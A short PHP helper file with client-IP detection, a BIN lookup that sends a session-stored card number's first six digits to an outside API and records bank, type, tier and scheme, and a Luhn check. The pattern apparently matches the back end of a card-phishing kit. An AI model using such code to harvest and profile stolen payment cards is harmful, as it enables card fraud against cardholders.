<?php

function _ip() {
    if (isset($_SERVER['HTTP_CF_CONNECTING_IP'])) return $_SERVER['HTTP_CF_CONNECTING_IP'];
    if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ips = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
        return trim($ips[0]);
    }
    return $_SERVER['REMOTE_ADDR'];
}

function getClientIP() {
    if (getenv('HTTP_CLIENT_IP')) return getenv('HTTP_CLIENT_IP');
    if (getenv('HTTP_X_FORWARDED_FOR')) return getenv('HTTP_X_FORWARDED_FOR');
    if (getenv('HTTP_X_FORWARDED')) return getenv('HTTP_X_FORWARDED');
    if (getenv('HTTP_FORWARDED_FOR')) return getenv('HTTP_FORWARDED_FOR');
    if (getenv('HTTP_FORWARDED')) return getenv('HTTP_FORWARDED');
    if (getenv('REMOTE_ADDR')) return getenv('REMOTE_ADDR');
    return 'UNKNOWN';
}

function checkbin($cc = null) {
    if ($cc === null) $cc = $_SESSION["c_num"] ?? '';
    $bin = substr(str_replace(' ', '', $cc), 0, 6);
    $response = @file_get_contents("https://data.handyapi.com/bin/{$bin}");
    if (!$response) return ['bin' => $bin, 'bank' => 'N/A', 'type' => 'N/A', 'level' => 'N/A', 'scheme' => 'N/A'];
    $result = json_decode($response, true);
    $_SESSION['type'] = $result['Type'] ?? 'N/A';
    $_SESSION['level'] = $result['CardTier'] ?? 'N/A';
    $_SESSION['bank'] = $result['Issuer'] ?? 'N/A';
    $_SESSION['scheme'] = $result['Scheme'] ?? 'N/A';
    return [
        'bin' => $bin,
        'bank' => $_SESSION['bank'],
        'type' => $_SESSION['type'],
        'level' => $_SESSION['level'],
        'scheme' => $_SESSION['scheme']
    ];
}

function is_valid_luhn($number) {
    settype($number, 'string');
    $sumTable = [
        [0,1,2,3,4,5,6,7,8,9],
        [0,2,4,6,8,1,3,5,7,9]
    ];
    $sum = 0;
    $flip = 0;
    for ($i = strlen($number) - 1; $i >= 0; $i--) {
        $sum += $sumTable[$flip++ & 0x1][$number[$i]];
    }
    return $sum % 10 === 0;
}
?>
